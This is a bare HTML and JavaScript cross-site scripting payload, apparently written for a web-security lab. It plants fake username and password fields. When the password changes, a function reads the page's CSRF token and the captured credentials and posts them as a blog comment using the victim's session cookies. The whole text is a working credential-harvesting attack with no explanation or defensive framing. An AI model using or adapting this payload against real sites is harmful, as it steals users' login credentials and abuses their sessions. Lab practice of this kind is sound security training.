<input type='text' name='username'>
<input type='password' name='password' onchange='hax()'>
<script> 
    function hax(){
        var token = document.getElementsByName('csrf')[0].value;
        var username = document.getElementsByName('username')[0].value;
        var password = document.getElementsByName('password')[0].value;

        var data = new FormData();
        data.append('csrf', token);
        data.append('postId', 8);
        data.append('comment', `${username}:${password}`);
        data.append('name', 'victim');
        data.append('email', 'abc@gmail.com');
        data.append('website', 'https://www.abc.com');

        fetch('/post/comment', {
            method: 'POST',
            credentials: 'include',
            body: data
        });
    }
</script>
